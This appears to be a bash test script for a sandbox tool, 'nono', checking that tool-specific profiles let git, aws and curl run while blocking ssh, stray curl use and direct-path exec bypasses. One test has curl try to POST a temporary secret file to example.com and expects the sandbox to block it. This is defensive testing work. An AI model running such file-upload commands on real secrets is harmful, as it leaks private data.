#!/usr/bin/env bash
set -u

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
BIN="${BIN:-$ROOT/target/debug/nono}"
AWS_PROFILE_FILE="$ROOT/local-profiles/eti-aws-credentials-no-curl.json"
CURL_PROFILE_FILE="$ROOT/local-profiles/eti-curl-network-no-files.json"

pass() {
  printf '[ok] %s\n' "$1"
}

fail() {
  printf '[fail] %s\n' "$1" >&2
  exit 1
}

run_capture() {
  local outfile="$1"
  shift
  "$@" >"$outfile" 2>&1
}

expect_success() {
  local label="$1"
  shift
  local out
  out="$(mktemp)"
  if run_capture "$out" "$@"; then
    pass "$label"
    rm -f "$out"
  else
    cat "$out" >&2
    rm -f "$out"
    fail "$label"
  fi
}

expect_failure_contains() {
  local label="$1"
  local needle="$2"
  shift 2
  local out
  out="$(mktemp)"
  if run_capture "$out" "$@"; then
    cat "$out" >&2
    rm -f "$out"
    fail "$label unexpectedly succeeded"
  fi
  if grep -Fq "$needle" "$out"; then
    pass "$label"
    rm -f "$out"
  else
    cat "$out" >&2
    rm -f "$out"
    fail "$label did not contain: $needle"
  fi
}

if [[ ! -x "$BIN" ]]; then
  fail "BIN is not executable: $BIN"
fi

expect_success "built-in git ETI can launch git" \
  "$BIN" run --profile linux-eti-git-ssh -- git --version

expect_failure_contains "built-in git ETI denies direct session ssh" "session_can_use missing" \
  "$BIN" run --profile linux-eti-git-ssh -- ssh -V

if [[ -f /usr/bin/ssh ]]; then
  expect_failure_contains "built-in git ETI denies direct /usr/bin/ssh" "direct exec bypass denied" \
    "$BIN" run --profile linux-eti-git-ssh -- /usr/bin/ssh -V
fi

if [[ -f "$AWS_PROFILE_FILE" && -e /usr/sbin/aws ]]; then
  expect_success "local AWS ETI can launch pinned aws" \
    "$BIN" run --profile "$AWS_PROFILE_FILE" -- aws --version

  expect_failure_contains "local AWS ETI denies curl through PATH" "session_can_use missing" \
    "$BIN" run --profile "$AWS_PROFILE_FILE" -- curl --version

  if [[ -f /usr/bin/curl ]]; then
    expect_failure_contains "local AWS ETI denies direct /usr/bin/curl" "direct exec bypass denied" \
      "$BIN" run --profile "$AWS_PROFILE_FILE" -- /usr/bin/curl --version
  fi
else
  printf '[skip] local AWS ETI profile or /usr/sbin/aws missing\n'
fi

if [[ -f "$CURL_PROFILE_FILE" && -f /usr/bin/curl ]]; then
  secret_file="$(mktemp)"
  printf 'nono-eti-secret\n' >"$secret_file"

  expect_success "local curl ETI can use network without cwd grants" \
    "$BIN" run --profile "$CURL_PROFILE_FILE" -- curl --max-time 10 -I https://example.com

  expect_failure_contains "local curl ETI cannot POST a local file" "Failed to open" \
    "$BIN" run --profile "$CURL_PROFILE_FILE" -- curl --max-time 10 --data-binary "@$secret_file" https://example.com

  rm -f "$secret_file"
else
  printf '[skip] local curl ETI profile or /usr/bin/curl missing\n'
fi
